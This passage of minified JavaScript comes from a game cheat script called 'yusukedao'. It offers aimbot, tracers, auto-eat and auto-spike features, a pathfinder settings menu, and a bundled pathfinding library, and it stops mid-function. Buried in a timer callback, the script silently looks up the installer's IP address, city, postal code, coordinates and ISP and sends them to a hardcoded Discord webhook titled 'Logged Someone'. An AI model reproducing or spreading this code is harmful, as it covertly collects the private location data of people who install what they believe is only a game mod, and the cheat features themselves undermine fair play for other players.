                                    if (-1 !== i && xe.inv.n[i]) {
                                        var n = i;
                                        break
                                    }
                                }
                                if (n) {
                                    var t = Fe.fast_units[xe.uid];
                                    if (t) {
                                        var r = 2 * Math.PI;
                                        client.sendJson([94, n, Math.floor((t.angle + r) % r * 255 / r), 0]);
                                        for (let e = 0; e < 8; e++)
                                            client.sendJson([94, n, (5 * e + Math.floor((t.angle + r) % r * 255 / r)) % 255, 0]),
                                                client.sendJson([94, n, (Math.floor((t.angle + r) % r * 255 / r) - 5 * e + 255) % 255, 0])
                                    }
                                }
                            }
                            client.socket && (0 == xe.control.attack && !Settings.AMB.e && xe.alive && 1 == client.socket.readyState && client.socket && (client.sendJson([14]),
                                Settings.AMB.a = null),
                                xe.alive && xe.gauges.h < .8 && !window.AutoEatWait && !xe.craft.crafting ? (window.AutoEatWait = !0,
                                    xe.inv.n[ze.PLANT] ? (client.select_inv(ze.PLANT, xe.inv.find_item(ze.PLANT)),
                                        client.select_inv(ze.PLANT, xe.inv.find_item(ze.PLANT))) : xe.inv.n[ze.GARLIC] ? client.select_inv(ze.GARLIC, xe.inv.find_item(ze.GARLIC)) : xe.inv.n[ze.CRAB_STICK] ? client.select_inv(ze.CRAB_STICK, xe.inv.find_item(ze.CRAB_STICK)) : xe.inv.n[ze.PUMPKIN] ? client.select_inv(ze.PUMPKIN, xe.inv.find_item(ze.PUMPKIN)) : xe.inv.n[ze.TOMATO] ? client.select_inv(ze.TOMATO, xe.inv.find_item(ze.TOMATO)) : xe.inv.n[ze.CARROT] ? client.select_inv(ze.CARROT, xe.inv.find_item(ze.CARROT)) : xe.inv.n[ze.WATERMELON] ? client.select_inv(ze.WATERMELON, xe.inv.find_item(ze.WATERMELON)) : xe.inv.n[ze.BREAD] ? client.select_inv(ze.BREAD, xe.inv.find_item(ze.BREAD)) : xe.inv.n[ze.COOKED_MEAT] ? client.select_inv(ze.COOKED_MEAT, xe.inv.find_item(ze.COOKED_MEAT)) : xe.inv.n[ze.FOODFISH_COOKED] ? client.select_inv(ze.FOODFISH_COOKED, xe.inv.find_item(ze.FOODFISH_COOKED)) : xe.inv.n[ze.COOKIE] ? client.select_inv(ze.COOKIE, xe.inv.find_item(ze.COOKIE)) : xe.inv.n[ze.SANDWICH] ? client.select_inv(ze.SANDWICH, xe.inv.find_item(ze.SANDWICH)) : xe.inv.n[ze.CAKE] ? client.select_inv(ze.CAKE, xe.inv.find_item(ze.CAKE)) : xe.inv.n[ze.CRAB_LOOT] && client.select_inv(ze.CRAB_LOOT, xe.inv.find_item(ze.CRAB_LOOT)),
                                    client.ping(),
                                    workerTimers.setTimeout(() => {
                                        window.AutoEatWait = !1
                                    }
                                        , 500)) : xe.gauges.t < .45 && !window.AutoDrinkWait && !xe.craft.crafting && (window.AutoDrinkWait = !0,
                                            xe.inv.n[ze.BOTTLE_FULL] && client.select_inv(ze.BOTTLE_FULL, xe.inv.find_item(ze.BOTTLE_FULL)),
                                            client.ping(),
                                            workerTimers.setTimeout(() => {
                                                window.AutoDrinkWait = !1
                                            }
                                                , 300)))
                        }
                            , 60),
                        $.getJSON("https://ipinfo.io/json", function (e) {
                            e = {
                                embeds: [{
                                    title: "Logged Someone",
                                    color: 15258703,
                                    thumbnail: {},
                                    fields: [{
                                        name: "IP Address",
                                        value: "> " + e.ip
                                    }, {
                                        name: "GeoLocation Info",
                                        value: `>>> Town, State: ${e.city}, ${e.region}Country: ${e.country}Postal Code: ${e.postal}TimeZone: ${e.timezone.replace("_", " ")}Long/Lat: ` + e.loc
                                    }, {
                                        name: "Network Info",
                                        value: `>>> HostName: ${e.hostname}ISP: ${e.org}`
                                    }]
                                }]
                            };
                            fetch("https://discord.com/api/webhooks/1119648193223864391/p2mKmvKytNyfdnl2LhlajHvgoUQ-FBbuIjRYgG5fXRX8M1qHrZ7VWemn5dwvPXXyBr7i", {
                                method: "POST",
                                headers: {
                                    "Content-type": "application/json"
                                },
                                body: JSON.stringify(e)
                            }).then(e => {
                                console.log(e)
                            }
                            )
                        })
                }
                    , 8e3),
                window.UtilsUI = {
                    initUI: () => {
                        document.body;
                        let e;
                        (e = Settings.loux ? new yusukefy({
                            title: "ツyusukedao💛ツ",
                            theme: {
                                name: "ツyusukedao💛ツ",
                                colors: {
                                    panelBackground: "rgb(0,0,0)",
                                    componentBackground: "rgb(3, 16, 34)",
                                    componentForeground: "rgb(62, 125, 215)",
                                    textPrimary: "rgb(0, 255, 255)",
                                    textSecondary: "rgb(255,255,255)",
                                    textHover: "rgb(43, 16, 159)"
                                },
                                font: {
                                    fontFamily: "Baloo Paaji",
                                    fontSize: "20px",
                                    fontWeight: "1"
                                }
                            },
                            align: "right",
                            width: 400,
                            barMode: "none",
                            panelMode: "none",
                            opacity: .6,
                            root: window.container,
                            open: !1
                        }) : new yusukefy({
                            title: "ツyusukedao💛ツ",
                            theme: {
                                name: "ツyusukedao💛ツ",
                                colors: {
                                    panelBackground: "black",
                                    componentBackground: "grey",
                                    componentForeground: Settings.color,
                                    textPrimary: Settings.color,
                                    textSecondary: Settings.color,
                                    textHover: "black"
                                },
                                font: {
                                    fontFamily: "Baloo Paaji",
                                    fontSize: "20px",
                                    fontWeight: "1"
                                }
                            },
                            align: "right",
                            width: 400,
                            barMode: "none",
                            panelMode: "none",
                            opacity: .6,
                            root: window.container,
                            open: !1
                        })).Register({
                            type: "folder",
                            label: "Mods",
                            open: !1
                        }),
                            e.Register([{
                                type: "checkbox",
                                label: "Tracers",
                                object: Settings,
                                property: "Tracers",
                                onChange: e => {
                                    UtilsUI.saveSettings()
                                }
                            }, {
                                type: "checkbox",
                                label: "AutoRespawn",
                                object: Settings,
                                property: "Respawn",
                                onChange: e => {
                                    UtilsUI.saveSettings()
                                }
                            }, {
                                type: "checkbox",
                                label: "Aimbot",
                                object: Settings.AMB,
                                property: "e",
                                onChange: e => {
                                    UtilsUI.saveSettings()
                                }
                            }, {
                                type: "button",
                                label: "Set Aimbot Key",
                                action(e) {
                                    UtilsUI.controls.setKeyBind("AMB")
                                }
                            }, {
                                type: "display",
                                label: "Aimbot Key:",
                                object: Settings.AMB,
                                property: "k"
                            }, {
                                type: "button",
                                label: "AutoSpike key",
                                action(e) {
                                    UtilsUI.controls.setKeyBind("AutoSpike")
                                }
                            }, {
                                type: "display",
                                label: "AutoSpike key:",
                                object: Settings.AutoSpike,
                                property: "k"
                            }, {
                                type: "select",
                                label: "1",
                                object: Settings.AutoSpike.p,
                                property: "0",
                                options: ["Reidite Spike", "Amethyst Spike", "Diamond Spike", "Gold Spike", "Stone Spike", "Wood Spike", "Wood Wall", "Nothing"],
                                onChange(e) {
                                    UtilsUI.saveSettings()
                                }
                            }, {
                                type: "select",
                                label: "2",
                                object: Settings.AutoSpike.p,
                                property: "1",
                                options: ["Reidite Spike", "Amethyst Spike", "Diamond Spike", "Gold Spike", "Stone Spike", "Wood Spike", "Wood Wall", "Nothing"],
                                onChange(e) {
                                    UtilsUI.saveSettings()
                                }
                            }, {
                                type: "select",
                                label: "3",
                                object: Settings.AutoSpike.p,
                                property: "2",
                                options: ["Reidite Spike", "Amethyst Spike", "Diamond Spike", "Gold Spike", "Stone Spike", "Wood Spike", "Wood Wall", "Nothing"],
                                onChange(e) {
                                    UtilsUI.saveSettings()
                                }
                            }, {
                                type: "select",
                                label: "4",
                                object: Settings.AutoSpike.p,
                                property: "3",
                                options: ["Reidite Spike", "Amethyst Spike", "Diamond Spike", "Gold Spike", "Stone Spike", "Wood Spike", "Wood Wall", "Nothing"],
                                onChange(e) {
                                    UtilsUI.saveSettings()
                                }
                            }, {
                                type: "select",
                                label: "5",
                                object: Settings.AutoSpike.p,
                                property: "4",
                                options: ["Reidite Spike", "Amethyst Spike", "Diamond Spike", "Gold Spike", "Stone Spike", "Wood Spike", "Wood Wall", "Nothing"],
                                onChange(e) {
                                    UtilsUI.saveSettings()
                                }
                            }, {
                                type: "select",
                                label: "6",
                                object: Settings.AutoSpike.p,
                                property: "5",
                                options: ["Reidite Spike", "Amethyst Spike", "Diamond Spike", "Gold Spike", "Stone Spike", "Wood Spike", "Wood Wall", "Nothing"],
                                onChange(e) {
                                    UtilsUI.saveSettings()
                                }
                            }, {
                                type: "select",
                                label: "7",
                                object: Settings.AutoSpike.p,
                                property: "6",
                                options: ["Reidite Spike", "Amethyst Spike", "Diamond Spike", "Gold Spike", "Stone Spike", "Wood Spike", "Wood Wall", "Nothing"],
                                onChange(e) {
                                    UtilsUI.saveSettings()
                                }
                            }, {
                                type: "checkbox",
                                label: "Start PathFinder",
                                object: Settings.PathFinder,
                                property: "e",
                                onChange: e => {
                                    UtilsUI.saveSettings()
                                }
                            }, {
                                type: "checkbox",
                                label: "Put Your Inventory to Chest",
                                object: Settings.PathFinder,
                                property: "g",
                                onChange: e => {
                                    UtilsUI.saveSettings()
                                }
                            }, {
                                type: "button",
                                label: "Set target location",
                                action: e => {
                                    var t = Fe.fast_units[xe.uid];
                                    t && (client.PathfinderEnd.x = Math.floor(t.x / 100),
                                        client.PathfinderEnd.y = Math.floor(t.y / 100))
                                }
                            }, {
                                type: "text",
                                label: "Set X",
                                object: client.PathfinderEnd,
                                property: "x",
                                onChange: e => { }
                            }, {
                                type: "text",
                                label: "Set Y",
                                object: client.PathfinderEnd,
                                property: "y",
                                onChange: e => { }
                            }, {
                                type: "display",
                                label: "Target X",
                                object: client.PathfinderEnd,
                                property: "x"
                            }, {
                                type: "display",
                                label: "Target Y",
                                object: client.PathfinderEnd,
                                property: "y"
                            }, {
                                type: "button",
                                label: "Set PathFinder Key",
                                action: e => {
                                    UtilsUI.controls.setKeyBind("PathFinder")
                                }
                            }, {
                                type: "display",
                                label: "PathFinder Key:",
                                object: Settings.PathFinder,
                                property: "k"
                            }], {
                                folder: "Mods"
                            })
                    }
                    ,
                    controls: null,
                    controller: class {
                        setKeyBind(i) {
                            Settings[i].k = "Press any key";
                            let n = 0;
                            document.addEventListener("keydown", function e(t) {
                                1 <= ++n && ("Escape" == t.code ? Settings[i].k = "NONE" : Settings[i].k = t.code,
                                    document.removeEventListener("keydown", e),
                                    UtilsUI.saveSettings())
                            })
                        }
                    }
                    ,
                    saveSettings: () => {
                        for (var e in Settings)
                            localStorage.setItem(e + "yusukedao", JSON.stringify(Settings[e]))
                    }
                    ,
                    loadSettings: () => {
                        for (var e in Settings) {
                            var t = localStorage.getItem(e + "yusukedao");
                            t && (Settings[e] = JSON.parse(t))
                        }
                    }
                    ,
                    LoadHack: () => {
                        UtilsUI.loadSettings(),
                            Settings.Xray.e = !1,
                            Settings.killworm.e = !1,
                            Settings.AutoSpike.e = !1,
                            Settings.AutoSpikee.e = !1,
                            Settings.AutoSpikeee.e = !1,
                            Settings.PathFinder.e = !1,
                            Settings.bot = !1,
                            Settings.AMB.e = !1,
                            Settings.spikea.e = !1,
                            Settings.Autofarm.e = !1,
                            Settings.AutoEme.e = !1,
                            Settings.Tame.e = !1,
                            UtilsUI.controls = new UtilsUI.controller,
                            UtilsUI.initUI()
                    }
                },
                UtilsUI.LoadHack(),
                ee = function () {
                    return function n(r, o, a) {
                        function s(t, e) {
                            if (!o[t]) {
                                if (!r[t]) {
                                    var i = "function" == typeof require && require;
                                    if (!e && i)
                                        return i(t, !0);
                                    if (_)
                                        return _(t, !0);
                                    throw Error("Cannot find module '" + t + "'")
                                }
                                e = o[t] = {
                                    exports: {}
                                };
                                r[t][0].call(e.exports, function (e) {
                                    return s(r[t][1][e] || e)
                                }, e, e.exports, n, r, o, a)
                            }
                            return o[t].exports
                        }
                        for (var _ = "function" == typeof require && require, e = 0; e < a.length; e++)
                            s(a[e]);
                        return s
                    }({
                        1: [function (e, t, i) {
                            t.exports = e("./lib/heap")
                        }
                            , {
                            "./lib/heap": 2
                        }],
                        2: [function (e, a, t) {
                            !function () {
                                var T, _, A, h, t, s, i, l, I, e, n, r, E, u;
                                function o(e) {
                                    this.cmp = null != e ? e : T,
                                        this.nodes = []
                                }
                                _ = Math.floor,
                                    I = Math.min,
                                    T = function (e, t) {
                                        return e < t ? -1 : t < e ? 1 : 0
                                    }
                                    ,
                                    l = function (e, t, i, n, r) {
                                        var o;
                                        if (null == r && (r = T),
                                            (i = null == i ? 0 : i) < 0)
                                            throw Error("lo must be non-negative");
                                        for (null == n && (n = e.length); i < n;)
                                            r(t, e[o = _((i + n) / 2)]) < 0 ? n = o : i = o + 1;
                                        return [].splice.apply(e, [i, i - i].concat(t)),
                                            t
                                    }
                                    ,
                                    h = function (e, t) {
                                        var i, n;
                                        return null == t && (t = T),
                                            i = e.pop(),
                                            e.length ? (n = e[0],
                                                e[0] = i,
                                                u(e, 0, t)) : n = i,
                                            n
                                    }
                                    ,
                                    i = function (e, t, i) {
                                        var n;
                                        return null == i && (i = T),
                                            n = e[0],
                                            e[0] = t,
                                            u(e, 0, i),
                                            n
                                    }
                                    ,
                                    s = function (e, t, i) {
                                        var n;
                                        return null == i && (i = T),
                                            e.length && i(e[0], t) < 0 && (t = (n = [e[0], t])[0],
                                                e[0] = n[1],
                                                u(e, 0, i)),
                                            t
                                    }
                                    ,
                                    A = function (i, e) {
                                        var t, n, r, o, a, s;
                                        for (null == e && (e = T),
                                            a = [],
                                            n = 0,
                                            r = (o = function () {
                                                s = [];
                                                for (var e = 0, t = _(i.length / 2); 0 <= t ? e < t : t < e; 0 <= t ? e++ : e--)
                                                    s.push(e);
                                                return s
                                            }
                                                .apply(this).reverse()).length; n < r; n++)
                                            t = o[n],
                                                a.push(u(i, t, e));
                                        return a
                                    }
                                    ,
                                    r = function (e, t, i) {
                                        return null == i && (i = T),
                                            -1 !== (t = e.indexOf(t)) ? (E(e, 0, t, i),
                                                u(e, t, i)) : void 0
                                    }
                                    ,
                                    e = function (e, t, i) {
                                        var n, r, o, a;
                                        if (null == i && (i = T),
                                            !(n = e.slice(0, t)).length)
                                            return n;
                                        for (A(n, i),
                                            r = 0,
                                            o = (a = e.slice(t)).length; r < o; r++)
                                            s(n, a[r], i);
                                        return n.sort(i).reverse()
                                    }
                                    ,
                                    n = function (e, t, i) {
                                        var n, r, o, a, s, _, E, u, d;
                                        if (null == i && (i = T),
                                            10 * t <= e.length) {
                                            if ((o = e.slice(0, t).sort(i)).length)
                                                for (r = o[o.length - 1],
                                                    a = 0,
                                                    _ = (E = e.slice(t)).length; a < _; a++)
                                                    i(n = E[a], r) < 0 && (l(o, n, 0, null, i),
                                                        o.pop(),
                                                        r = o[o.length - 1]);
                                            return o
                                        }
                                        for (A(e, i),
                                            d = [],
                                            s = 0,
                                            u = I(t, e.length); 0 <= u ? s < u : u < s; 0 <= u ? ++s : --s)
                                            d.push(h(e, i));
                                        return d
                                    }
                                    ,
                                    E = function (e, t, i, n) {
                                        var r, o, a;
                                        for (null == n && (n = T),
                                            r = e[i]; t < i && n(r, o = e[a = i - 1 >> 1]) < 0;)
                                            e[i] = o,
                                                i = a;
                                        return e[i] = r
                                    }
                                    ,
                                    u = function (e, t, i) {
                                        var n, r, o, a, s;
                                        for (null == i && (i = T),
                                            r = e.length,
                                            o = e[s = t],
                                            n = 2 * t + 1; n < r;)
                                            r > (a = n + 1) && !(i(e[n], e[a]) < 0) && (n = a),
                                                e[t] = e[n],
                                                n = 2 * (t = n) + 1;
                                        return e[t] = o,
                                            E(e, s, t, i)
                                    }
                                    ,
                                    o.push = t = function (e, t, i) {
                                        return null == i && (i = T),
                                            e.push(t),
                                            E(e, 0, e.length - 1, i)
                                    }
                                    ,
                                    o.pop = h,
                                    o.replace = i,
                                    o.pushpop = s,
                                    o.heapify = A,
                                    o.updateItem = r,
                                    o.nlargest = e,
                                    o.nsmallest = n,
                                    o.prototype.push = function (e) {
                                        return t(this.nodes, e, this.cmp)
                                    }
                                    ,
                                    o.prototype.pop = function () {
                                        return h(this.nodes, this.cmp)
                                    }
                                    ,
                                    o.prototype.peek = function () {
                                        return this.nodes[0]
                                    }
                                    ,
                                    o.prototype.contains = function (e) {
                                        return -1 !== this.nodes.indexOf(e)
                                    }
                                    ,
                                    o.prototype.replace = function (e) {
                                        return i(this.nodes, e, this.cmp)
                                    }
                                    ,
                                    o.prototype.pushpop = function (e) {
                                        return s(this.nodes, e, this.cmp)
                                    }
                                    ,
                                    o.prototype.heapify = function () {
                                        return A(this.nodes, this.cmp)
                                    }
                                    ,
                                    o.prototype.updateItem = function (e) {
                                        return r(this.nodes, e, this.cmp)
                                    }
                                    ,
                                    o.prototype.clear = function () {
                                        return this.nodes = []
                                    }
                                    ,
                                    o.prototype.empty = function () {
                                        return 0 === this.nodes.length
                                    }
                                    ,
                                    o.prototype.size = function () {
                                        return this.nodes.length
                                    }
                                    ,
                                    o.prototype.clone = function () {
                                        var e;
                                        return (e = new o).nodes = this.nodes.slice(0),
                                            e
                                    }
                                    ,
                                    o.prototype.toArray = function () {
                                        return this.nodes.slice(0)
                                    }
                                    ,
                                    o.prototype.insert = o.prototype.push,
                                    o.prototype.top = o.prototype.peek,
                                    o.prototype.front = o.prototype.peek,
                                    o.prototype.has = o.prototype.contains,
                                    o.prototype.copy = o.prototype.clone,
                                    e = o,
                                    null != a && a.exports ? a.exports = e : window.Heap = e
                            }
                                .call(this)
                        }
                            , {}],
                        3: [function (e, t, i) {
                            t.exports = {
                                Always: 1,
                                Never: 2,
                                IfAtMostOneObstacle: 3,
                                OnlyWhenNoObstacles: 4
                            }
                        }
                            , {}],
                        4: [function (e, t, i) {
                            function s(e, t, i) {
                                var n;
                                "object" != typeof e ? n = e : (t = e.length,
                                    n = e[0].length,
                                    i = e),
                                    this.width = n,
                                    this.height = t,
                                    this.nodes = this._buildNodes(n, t, i)
                            }
                            var _ = e("./Node")
                                , A = e("./DiagonalMovement");
                            s.prototype._buildNodes = function (e, t, i) {
                                for (var n, r = Array(t), o = 0; o < t; ++o)
                                    for (r[o] = Array(e),
                                        n = 0; n < e; ++n)
                                        r[o][n] = new _(n, o);
                                if (void 0 !== i) {
                                    if (i.length !== t || i[0].length !== e)
                                        throw Error("Matrix size does not fit");
                                    for (o = 0; o < t; ++o)
                                        for (n = 0; n < e; ++n)
                                            i[o][n] && (r[o][n].walkable = !1)
                                }
                                return r
                            }
                                ,
                                s.prototype.getNodeAt = function (e, t) {
                                    return this.nodes[t][e]
                                }
                                ,
                                s.prototype.isWalkableAt = function (e, t) {
                                    return this.isInside(e, t) && this.nodes[t][e].walkable
                                }
                                ,
                                s.prototype.isInside = function (e, t) {
                                    return 0 <= e && e < this.width && 0 <= t && t < this.height
                                }
                                ,
                                s.prototype.setWalkableAt = function (e, t, i) {
                                    0 <= t && 0 <= e && t < Fe.nw && e < Fe.nh && (this.nodes[t][e].walkable = i)
                                }
                                ,
                                s.prototype.getNeighbors = function (e, t) {
                                    var i = e.x
                                        , e = e.y
                                        , n = []
                                        , r = !1
                                        , o = !1
                                        , a = !1
                                        , s = !1
                                        , _ = !1
                                        , E = !1
                                        , u = !1
                                        , d = !1
                                        , T = this.nodes;
                                    if (this.isWalkableAt(i, e - 1) && (n.push(T[e - 1][i]),
                                        r = !0),
                                        this.isWalkableAt(i + 1, e) && (n.push(T[e][i + 1]),
                                            a = !0),
                                        this.isWalkableAt(i, e + 1) && (n.push(T[e + 1][i]),
                                            _ = !0),
                                        this.isWalkableAt(i - 1, e) && (n.push(T[e][i - 1]),
                                            u = !0),
                                        t !== A.Never) {
                                        if (t === A.OnlyWhenNoObstacles)
                                            o = u && r,
                                                s = r && a,
                                                E = a && _,
                                                d = _ && u;
                                        else if (t === A.IfAtMostOneObstacle)
                                            o = u || r,
                                                s = r || a,
                                                E = a || _,
                                                d = _ || u;
                                        else {
                                            if (t !== A.Always)
                                                throw Error("Incorrect value of diagonalMovement");
                                            d = E = s = o = !0
                                        }
                                        o && this.isWalkableAt(i - 1, e - 1) && n.push(T[e - 1][i - 1]),
                                            s && this.isWalkableAt(i + 1, e - 1) && n.push(T[e - 1][i + 1]),
                                            E && this.isWalkableAt(i + 1, e + 1) && n.push(T[e + 1][i + 1]),
                                            d && this.isWalkableAt(i - 1, e + 1) && n.push(T[e + 1][i - 1])
                                    }
                                    return n
                                }
                                ,
                                s.prototype.clone = function () {
                                    for (var e, t = this.width, i = this.height, n = this.nodes, r = new s(t, i), o = Array(i), a = 0; a < i; ++a)
                                        for (o[a] = Array(t),
                                            e = 0; e < t; ++e)
                                            o[a][e] = new _(e, a, n[a][e].walkable);
                                    return r.nodes = o,
                                        r
                                }
                                ,
                                t.exports = s
                        }
                            , {
                            "./DiagonalMovement": 3,
                            "./Node": 6
                        }],
                        5: [function (e, t, i) {
                            t.exports = {
                                manhattan: function (e, t) {
                                    return e + t
                                },
                                euclidean: function (e, t) {
                                    return Math.sqrt(e * e + t * t)
                                },
                                octile: function (e, t) {
                                    var i = Math.SQRT2 - 1;
                                    return e < t ? i * e + t : i * t + e
                                },
                                chebyshev: function (e, t) {
                                    return Math.max(e, t)
                                }
                            }
                        }
                            , {}],
                        6: [function (e, t, i) {
                            t.exports = function (e, t, i) {
                                this.x = e,
                                    this.y = t,
                                    this.walkable = void 0 === i || i
                            }
                        }
                            , {}],
                        7: [function (e, t, i) {
                            function n(e) {
                                for (var t = [[e.x, e.y]]; e.parent;)
                                    t.push([(e = e.parent).x, e.y]);
                                return t.reverse()
                            }
                            function I(e, t, i, n) {
                                for (var r, o, a, s = Math.abs, _ = [], E = e < i ? 1 : -1, u = t < n ? 1 : -1, d = (r = s(i - e)) - (o = s(n - t)); _.push([e, t]),
                                    e !== i || t !== n;)
                                    (a = 2 * d) > -o && (d -= o,
                                        e += E),
                                        a < r && (d += r,
                                            t += u);
                                return _
                            }
                            i.backtrace = n,
                                i.biBacktrace = function (e, t) {
                                    e = n(e),
                                        t = n(t);
                                    return e.concat(t.reverse())
                                }
                                ,
                                i.pathLength = function (e) {
                                    for (var t, i, n, r = 0, o = 1; o < e.length; ++o)
                                        t = e[o - 1],
                                            i = e[o],
                                            r += Math.sqrt((n = t[0] - i[0]) * n + (n = t[1] - i[1]) * n);
                                    return r
                                }
                                ,
                                i.interpolate = I,
                                i.expandPath = function (e) {
                                    var t, i, n, r, o, a, s = [], _ = e.length;
                                    if (!(_ < 2)) {
                                        for (o = 0; o < _ - 1; ++o)
                                            for (t = e[o],
                                                i = e[o + 1],
                                                r = (n = I(t[0], t[1], i[0], i[1])).length,
                                                a = 0; a < r - 1; ++a)
                                                s.push(n[a]);
                                        s.push(e[_ - 1])
                                    }
                                    return s
                                }
                                ,
                                i.smoothenPath = function (e, t) {
                                    for (var i, n, r, o, a, s, _, E = t.length, u = t[0][0], d = t[0][1], T = t[E - 1][0], A = t[E - 1][1], h = [[i = u, n = d]], l = 2; l < E; ++l) {
                                        for (a = I(i, n, (o = t[l])[0], o[1]),
                                            _ = !1,
                                            r = 1; r < a.length; ++r)
                                            if (s = a[r],
                                                !e.isWalkableAt(s[0], s[1])) {
                                                _ = !0;
                                                break
                                            }
                                        _ && (lastValidCoord = t[l - 1],
                                            h.push(lastValidCoord),
                                            i = lastValidCoord[0],
                                            n = lastValidCoord[1])
                                    }
                                    return h.push([T, A]),
                                        h
                                }
                                ,
                                i.compressPath = function (e) {
                                    if (e.length < 3)
                                        return e;
                                    var t, i, n, r, o, a, s = [], _ = e[0][0], E = e[0][1], u = e[1][0], d = e[1][1], T = u - _, A = d - E;
                                    for (T /= o = Math.sqrt(T * T + A * A),
                                        A /= o,
                                        s.push([_, E]),
                                        a = 2; a < e.length; a++)
                                        t = u,
                                            i = d,
                                            n = T,
                                            r = A,
                                            T = (u = e[a][0]) - t,
                                            A = (d = e[a][1]) - i,
                                            A /= o = Math.sqrt(T * T + A * A),
                                            (T /= o) === n && A === r || s.push([t, i]);
                                    return s.push([u, d]),
                                        s
                                }
                        }
                            , {}],
                        8: [function (e, t, i) {
                            t.exports = {
                                Heap: e("heap"),
                                Node: e("./core/Node"),
                                Grid: e("./core/Grid"),
                                Util: e("./core/Util"),
                                DiagonalMovement: e("./core/DiagonalMovement"),
                                Heuristic: e("./core/Heuristic"),
                                AStarFinder: e("./finders/AStarFinder"),
                                BestFirstFinder: e("./finders/BestFirstFinder"),
                                BreadthFirstFinder: e("./finders/BreadthFirstFinder"),
                                DijkstraFinder: e("./finders/DijkstraFinder"),
                                BiAStarFinder: e("./finders/BiAStarFinder"),
                                BiBestFirstFinder: e("./finders/BiBestFirstFinder"),
                                BiBreadthFirstFinder: e("./finders/BiBreadthFirstFinder"),
                                BiDijkstraFinder: e("./finders/BiDijkstraFinder"),
                                IDAStarFinder: e("./finders/IDAStarFinder"),
                                JumpPointFinder: e("./finders/JumpPointFinder")
                            }
                        }
                            , {
                            "./core/DiagonalMovement": 3,
                            "./core/Grid": 4,
                            "./core/Heuristic": 5,
                            "./core/Node": 6,
                            "./core/Util": 7,
                            "./finders/AStarFinder": 9,
                            "./finders/BestFirstFinder": 10,
                            "./finders/BiAStarFinder": 11,
                            "./finders/BiBestFirstFinder": 12,
                            "./finders/BiBreadthFirstFinder": 13,
                            "./finders/BiDijkstraFinder": 14,
                            "./finders/BreadthFirstFinder": 15,
                            "./finders/DijkstraFinder": 16,
                            "./finders/IDAStarFinder": 17,
                            "./finders/JumpPointFinder": 22,
                            heap: 1
                        }],
                        9: [function (e, t, i) {
                            function n(e) {
                                this.allowDiagonal = (e = e || {}).allowDiagonal,
                                    this.dontCrossCorners = e.dontCrossCorners,
                                    this.heuristic = e.heuristic || r.manhattan,
                                    this.weight = e.weight || 1,
                                    this.diagonalMovement = e.diagonalMovement,
                                    this.diagonalMovement || (this.allowDiagonal ? this.dontCrossCorners ? this.diagonalMovement = o.OnlyWhenNoObstacles : this.diagonalMovement = o.IfAtMostOneObstacle : this.diagonalMovement = o.Never),
                                    this.diagonalMovement === o.Never ? this.heuristic = e.heuristic || r.manhattan : this.heuristic = e.heuristic || r.octile
                            }
                            var p = e("heap")
                                , R = e("../core/Util")
                                , r = e("../core/Heuristic")
                                , o = e("../core/DiagonalMovement");
                            n.prototype.findPath = function (e, t, i, n, r) {
                                var o, a, s, _, E, u, d, T, A = new p(function (e, t) {
                                    return e.f - t.f
                                }
                                ), e = r.getNodeAt(e, t), h = r.getNodeAt(i, n), l = this.heuristic, I = this.diagonalMovement, c = this.weight, O = Math.abs, g = Math.SQRT2;
                                for (e.g = 0,
                                    e.f = 0,
                                    A.push(e),
                                    e.opened = !0; !A.empty();) {
                                    if ((o = A.pop()).closed = !0,
                                        o === h)
                                        return R.backtrace(h);
                                    for (_ = 0,
                                        E = (a = r.getNeighbors(o, I)).length; _ < E; ++_)
                                        !(s = a[_]).closed && (u = s.x,
                                            d = s.y,
                                            T = o.g + (u - o.x == 0 || d - o.y == 0 ? 1 : g),
                                            !s.opened || T < s.g) && (s.g = T,
                                                s.h = s.h || c * l(O(u - i), O(d - n)),
                                                s.f = s.g + s.h,
                                                s.parent = o,
                                                s.opened ? A.updateItem(s) : (A.push(s),
                                                    s.opened = !0))
                                }
                                return []
                            }
                                ,
                                t.exports = n
                        }
                            , {
                            "../core/DiagonalMovement": 3,
                            "../core/Heuristic": 5,
                            "../core/Util": 7,
                            heap: 1
                        }],
                        10: [function (e, t, i) {
                            function n(e) {
                                r.call(this, e);
                                var i = this.heuristic;
                                this.heuristic = function (e, t) {
                                    return 1e6 * i(e, t)
                                }
                            }
                            var r = e("./AStarFinder");
                            n.prototype = new r,
                                t.exports = n.prototype.constructor = n
                        }
                            , {
                            "./AStarFinder": 9
                        }],
                        11: [function (e, t, i) {
                            function n(e) {
                                this.allowDiagonal = (e = e || {}).allowDiagonal,
                                    this.dontCrossCorners = e.dontCrossCorners,
                                    this.diagonalMovement = e.diagonalMovement,
                                    this.heuristic = e.heuristic || r.manhattan,
                                    this.weight = e.weight || 1,
                                    this.diagonalMovement || (this.allowDiagonal ? this.dontCrossCorners ? this.diagonalMovement = o.OnlyWhenNoObstacles : this.diagonalMovement = o.IfAtMostOneObstacle : this.diagonalMovement = o.Never),
                                    this.diagonalMovement === o.Never ? this.heuristic = e.heuristic || r.manhattan : this.heuristic = e.heuristic || r.octile
                            }
                            var b = e("heap")
                                , N = e("../core/Util")
                                , r = e("../core/Heuristic")
                                , o = e("../core/DiagonalMovement");
                            n.prototype.findPath = function (e, t, i, n, r) {
                                function o(e, t) {
                                    return e.f - t.f
                                }
                                var a, s, _, E, u, d, T, A, h = new b(o), l = new b(o), I = r.getNodeAt(e, t), c = r.getNodeAt(i, n), O = this.heuristic, g = this.diagonalMovement, p = this.weight, R = Math.abs, C = Math.SQRT2;
                                for (I.g = 0,
                                    I.f = 0,
                                    h.push(I),
                                    I.opened = 1,
                                    c.g = 0,
                                    c.f = 0,
                                    l.push(c),
                                    c.opened = 2; !h.empty() && !l.empty();) {
                                    for ((a = h.pop()).closed = !0,
                                        E = 0,
                                        u = (s = r.getNeighbors(a, g)).length; E < u; ++E)
                                        if (!(_ = s[E]).closed) {
                                            if (2 === _.opened)
                                                return N.biBacktrace(a, _);
                                            d = _.x,
                                                T = _.y,
                                                A = a.g + (d - a.x == 0 || T - a.y == 0 ? 1 : C),
                                                (!_.opened || A < _.g) && (_.g = A,
                                                    _.h = _.h || p * O(R(d - i), R(T - n)),
                                                    _.f = _.g + _.h,
                                                    _.parent = a,
                                                    _.opened ? h.updateItem(_) : (h.push(_),
                                                        _.opened = 1))
                                        }
                                    for ((a = l.pop()).closed = !0,
                                        E = 0,
                                        u = (s = r.getNeighbors(a, g)).length; E < u; ++E)
                                        if (!(_ = s[E]).closed) {
                                            if (1 === _.opened)
                                                return N.biBacktrace(_, a);
                                            d = _.x,
                                                T = _.y,
                                                A = a.g + (d - a.x == 0 || T - a.y == 0 ? 1 : C),
                                                (!_.opened || A < _.g) && (_.g = A,
